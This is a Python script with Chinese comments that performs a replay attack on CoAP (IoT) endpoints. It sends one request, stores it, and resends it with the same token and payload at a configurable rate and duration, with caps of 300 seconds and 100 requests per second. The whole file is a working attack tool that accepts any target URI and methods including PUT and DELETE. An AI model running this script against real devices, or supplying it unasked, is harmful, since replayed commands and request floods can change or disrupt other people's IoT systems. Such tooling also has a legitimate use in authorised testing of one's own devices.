#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CoAP 重放攻击脚本 (CoAP Replay Attack Script)

此脚本捕获一个CoAP请求并重复发送，模拟重放攻击。
包含时长限制和速率控制以避免系统崩溃。

使用方法:
    python coap_replay_attack.py <target_uri> [options]

示例:
    python coap_replay_attack.py coap://localhost/sensor --duration 10 --rate 5
"""

import asyncio
import argparse
import logging
import time
from datetime import datetime
from aiocoap import Context, Message, GET

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class ReplayAttack:
    """CoAP重放攻击类"""
    
    def __init__(self, target_uri, method='GET', payload=None, duration=30, rate=10):
        """
        初始化重放攻击
        
        Args:
            target_uri: 目标CoAP URI
            method: HTTP方法 (GET, POST, PUT, DELETE)
            payload: 请求负载 (可选)
            duration: 攻击持续时间(秒)，默认30秒
            rate: 每秒发送请求数，默认10
        """
        self.target_uri = target_uri
        self.method = method.upper()
        self.payload = payload.encode() if payload else b""
        self.duration = duration
        self.rate = rate
        self.sent_count = 0
        self.success_count = 0
        self.error_count = 0
        self.captured_message = None
        
    async def capture_original_request(self, context):
        """捕获原始请求和响应"""
        logger.info(f"正在捕获原始请求: {self.target_uri}")
        
        try:
            # 创建原始请求
            request = Message(
                code=getattr(__import__('aiocoap'), self.method),
                uri=self.target_uri,
                payload=self.payload
            )
            
            # 发送并获取响应
            response = await context.request(request).response
            
            # 保存请求用于重放
            self.captured_message = request
            
            logger.info(f"✓ 成功捕获请求 - 响应码: {response.code}")
            logger.info(f"  Token: {request.token.hex()}")
            logger.info(f"  Payload: {request.payload[:50]}...")
            
            return True
            
        except Exception as e:
            logger.error(f"✗ 捕获请求失败: {e}")
            return False
    
    async def replay_request(self, context):
        """重放单个请求"""
        try:
            # 创建重放消息（使用相同的token和payload）
            replay_msg = Message(
                code=self.captured_message.code,
                uri=self.target_uri,
                payload=self.captured_message.payload,
                token=self.captured_message.token  # 使用相同的token进行重放
            )
            
            # 发送重放请求
            response = await asyncio.wait_for(
                context.request(replay_msg).response,
                timeout=5.0
            )
            
            self.sent_count += 1
            self.success_count += 1
            
            if self.sent_count % 10 == 0:
                logger.info(f"已发送 {self.sent_count} 个重放请求 (成功: {self.success_count}, 失败: {self.error_count})")
            
        except asyncio.TimeoutError:
            self.sent_count += 1
            self.error_count += 1
            logger.debug(f"请求超时")
        except Exception as e:
            self.sent_count += 1
            self.error_count += 1
            logger.debug(f"请求失败: {e}")
    
    async def run(self):
        """执行重放攻击"""
        logger.info("=" * 60)
        logger.info("CoAP 重放攻击开始")
        logger.info("=" * 60)
        logger.info(f"目标: {self.target_uri}")
        logger.info(f"方法: {self.method}")
        logger.info(f"持续时间: {self.duration} 秒")
        logger.info(f"速率: {self.rate} 请求/秒")
        logger.info("=" * 60)
        
        context = await Context.create_client_context()
        
        try:
            # 步骤1: 捕获原始请求
            if not await self.capture_original_request(context):
                logger.error("无法捕获原始请求，攻击终止")
                return
            
            logger.info(f"\n开始重放攻击，持续 {self.duration} 秒...")
            start_time = time.time()
            
            # 步骤2: 重放攻击
            while time.time() - start_time < self.duration:
                batch_start = time.time()
                
                # 批量发送请求
                tasks = [self.replay_request(context) for _ in range(self.rate)]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # 速率控制：确保每秒发送指定数量的请求
                elapsed = time.time() - batch_start
                if elapsed < 1.0:
                    await asyncio.sleep(1.0 - elapsed)
            
            # 攻击结束统计
            logger.info("\n" + "=" * 60)
            logger.info("攻击完成")
            logger.info("=" * 60)
            logger.info(f"总发送请求数: {self.sent_count}")
            logger.info(f"成功: {self.success_count}")
            logger.info(f"失败: {self.error_count}")
            logger.info(f"成功率: {self.success_count/self.sent_count*100:.2f}%" if self.sent_count > 0 else "N/A")
            logger.info("=" * 60)
            
        finally:
            await context.shutdown()


async def main():
    parser = argparse.ArgumentParser(
        description='CoAP重放攻击工具 - 捕获并重放CoAP请求',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('target', help='目标CoAP URI (例如: coap://localhost/sensor)')
    parser.add_argument('-m', '--method', default='GET', 
                       choices=['GET', 'POST', 'PUT', 'DELETE'],
                       help='CoAP方法 (默认: GET)')
    parser.add_argument('-p', '--payload', default=None,
                       help='请求负载内容')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='攻击持续时间(秒) (默认: 30, 最大: 300)')
    parser.add_argument('-r', '--rate', type=int, default=10,
                       help='每秒请求数 (默认: 10, 最大: 100)')
    
    args = parser.parse_args()
    
    # 安全限制
    duration = min(args.duration, 300)  # 最大5分钟
    rate = min(args.rate, 100)  # 最大100请求/秒
    
    if args.duration > 300:
        logger.warning(f"持续时间限制为300秒，已调整为300秒")
    if args.rate > 100:
        logger.warning(f"速率限制为100请求/秒，已调整为100")
    
    attack = ReplayAttack(
        target_uri=args.target,
        method=args.method,
        payload=args.payload,
        duration=duration,
        rate=rate
    )
    
    await attack.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n攻击被用户中断")

